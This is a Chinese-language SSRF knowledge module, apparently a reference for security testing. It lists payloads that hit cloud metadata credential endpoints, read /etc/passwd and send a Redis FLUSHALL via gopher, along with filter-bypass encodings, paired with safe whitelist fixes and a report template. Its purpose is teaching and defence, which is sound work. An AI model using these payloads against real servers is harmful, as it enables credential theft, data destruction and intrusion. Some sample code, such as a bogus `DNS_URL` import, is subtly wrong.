# SSRF 服务端请求伪造漏洞知识模块

## 漏洞描述

服务端请求伪造（Server-Side Request Forgery，SSRF）是一种安全漏洞，攻击者可以强迫服务器向攻击者指定的内部或外部资源发起请求。这可能导致内部网络扫描、敏感数据泄露，甚至远程代码执行。

## 危害等级

- **严重性**: High 到 Critical
- **影响**: 内网扫描、数据泄露、绕过防火墙、RCE

## 攻击场景

### 1. 内网扫描
```
?url=http://127.0.0.1:22
?url=http://192.168.1.1:8080
?url=http://localhost:6379
```

### 2. 云元数据访问
```
?url=http://169.254.169.254/latest/meta-data/
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### 3. 文件读取
```
?url=file:///etc/passwd
?url=file://localhost/etc/passwd
```

### 4. Redis 命令执行
```
?url=gopher://localhost:6379/_FLUSHALL
```

## 常见危险函数

### Python
```python
# ❌ 危险
requests.get(user_input)
urllib.request.urlopen(user_input)
urllib2.urlopen(user_input)
httpx.get(user_input)
```

### JavaScript
```javascript
// ❌ 危险
fetch(user_input)
axios.get(user_input)
request(user_input)
```

### Java
```java
// ❌ 危险
new URL(userInput).openConnection()
new HttpClient().send(userInput)
```

### Go
```go
// ❌ 危险
http.Get(userInput)
http.Post(userInput, ...)
```

### PHP
```php
// ❌ 危险
file_get_contents(user_input)
fopen(user_input)
curl_setopt($ch, CURLOPT_URL, userInput)
```

## 检测 Payload

### 基础测试
```
?url=http://example.com
?url=https://example.com
?url=http://127.0.0.1
?url=http://localhost
```

### 内网探测
```
?url=http://192.168.1.1
?url=http://10.0.0.1
?url=http://172.16.0.1
?url=http://127.0.0.1:8080
```

### 绕过过滤

**IP 绕过**:
```
http://127.0.0.1
http://localhost
http://0.0.0.0
http://[::]
http://2130706433  # 127.0.0.1 的十进制
http://0177.0.0.1   # 八进制
http://0x7f.0.0.1   # 十六进制
```

**URL 编码**:
```
http://127.0.0.1
http://%31%32%37%2e%30%2e%30%2e%31
http://127。0。0。1
```

**子域名绕过**:
```
http://example.com@127.0.0.1
http://127.0.0.1.example.com
```

**重定向绕过**:
```
http://example.com/redirect_to=http://127.0.0.1
```

## 云服务元数据端点

### AWS
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/
```

### GCP
```
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/
```

### Azure
```
http://169.254.169.254/metadata/
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

### 阿里云
```
http://100.100.100.200/latest/meta-data/
```

## 代码模式识别

### Python - Flask 示例
```python
# ❌ 危险 - 直接使用用户输入
@app.route('/fetch')
def fetch():
    url = request.args.get('url')
    resp = requests.get(url)  # SSRF
    return resp.text

# ✅ 安全 - 白名单验证
@app.route('/fetch')
def fetch():
    url = request.args.get('url')
    parsed = urlparse(url)

    # 白名单域名
    allowed_domains = ['api.example.com']
    if parsed.netloc not in allowed_domains:
        return "Invalid URL", 400

    # 只允许 http/https
    if parsed.scheme not in ['http', 'https']:
        return "Invalid scheme", 400

    resp = requests.get(url)
    return resp.text

# ✅ 更安全 - 使用预定义端点
ENDPOINTS = {
    'user': 'https://api.example.com/user',
    'posts': 'https://api.example.com/posts',
}

@app.route('/fetch')
def fetch():
    endpoint = request.args.get('endpoint')
    if endpoint not in ENDPOINTS:
        return "Invalid endpoint", 400

    resp = requests.get(ENDPOINTS[endpoint])
    return resp.text
```

### JavaScript - Express 示例
```javascript
// ❌ 危险
app.get('/fetch', async (req, res) => {
    const url = req.query.url;
    const response = await fetch(url);  // SSRF
    res.send(await response.text());
});

// ✅ 安全 - 验证和限制
import { URL } from 'url';
import { DNS_URL } from 'dns';

app.get('/fetch', async (req, res) => {
    const url = req.query.url;
    let parsed;

    try {
        parsed = new URL(url);
    } catch {
        return res.status(400).send('Invalid URL');
    }

    // 只允许 https
    if (parsed.protocol !== 'https:') {
        return res.status(400).send('Only HTTPS allowed');
    }

    // 白名单域名
    const allowed = ['api.example.com'];
    if (!allowed.includes(parsed.hostname)) {
        return res.status(400).send('Domain not allowed');
    }

    // 禁止访问内网
    const hostname = parsed.hostname;
    if (['localhost', '127.0.0.1', '0.0.0.0'].includes(hostname)) {
        return res.status(400).send('Internal access denied');
    }

    const response = await fetch(url);
    res.send(await response.text());
});
```

### Java - Spring Boot 示例
```java
// ❌ 危险
@GetMapping("/fetch")
public String fetch(@RequestParam String url) throws IOException {
    URL urlObj = new URL(url);
    HttpURLConnection conn = (HttpURLConnection) urlObj.openConnection();
    // SSRF
}

// ✅ 安全
@GetMapping("/fetch")
public String fetch(@RequestParam String endpoint) throws IOException {
    // 预定义端点
    Map<String, String> endpoints = Map.of(
        "user", "https://api.example.com/user",
        "posts", "https://api.example.com/posts"
    );

    String url = endpoints.get(endpoint);
    if (url == null) {
        throw new IllegalArgumentException("Invalid endpoint");
    }

    URL urlObj = new URL(url);
    HttpURLConnection conn = (HttpURLConnection) urlObj.openConnection();
    // ...
}
```

## 验证步骤

### 1. 识别输入点
- URL 参数
- 文件上传功能
- Webhook 配置
- 导入 URL 功能

### 2. 基础测试
- 尝试访问外部地址
- 尝试访问 localhost
- 尝试访问内网 IP

### 3. 深度测试
- 云元数据端点
- 常见内网端口
- 文件协议

### 4. 绕过测试
- IP 绕过
- 编码绕过
- 重定向绕过

## 修复建议

### 1. 输入验证
```python
# URL 白名单
ALLOWED_DOMAINS = ['api.example.com', 'cdn.example.com']

def validate_url(url):
    parsed = urlparse(url)
    if parsed.netloc not in ALLOWED_DOMAINS:
        raise ValueError("Domain not allowed")
    if parsed.scheme not in ['http', 'https']:
        raise ValueError("Only HTTP/HTTPS allowed")
    return url
```

### 2. 网络隔离
```python
# 使用专用网络进行外部请求
# 禁止访问内网 IP
private_ips = ipaddress.ip_network('10.0.0.0/8')
```

### 3. 使用库
```python
# ssrf-filter 库
from ssrf_filter import ssrf_filter

if not ssrf_filter(url):
    raise ValueError("Invalid URL")
```

### 4. 禁用不必要的协议
```python
# 只允许 http/https
# 禁止 file://, gopher://, ftp:// 等
```

## 常见端点

### 内网服务
```
127.0.0.1:6379   # Redis
127.0.0.1:3306   # MySQL
127.0.0.1:5432   # PostgreSQL
127.0.0.1:9200   # Elasticsearch
127.0.0.1:27017  # MongoDB
127.0.0.1:5672   # RabbitMQ
127.0.0.1:8500   # Consul
127.0.0.1:2379   # Etcd
```

## 报告格式

```markdown
## SSRF 漏洞

**位置**: `/api/fetch?url=...`
**严重性**: Critical

**Payload**:
```
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**漏洞代码**:
```python
url = request.args.get('url')
resp = requests.get(url)
```

**影响**:
- 可访问内网服务
- 可获取云服务凭证
- 可绕过网络隔离

**修复建议**:
```python
# 使用白名单
ALLOWED_DOMAINS = ['api.example.com']

parsed = urlparse(url)
if parsed.netloc not in ALLOWED_DOMAINS:
    return "Invalid URL", 400

resp = requests.get(url)
```
```
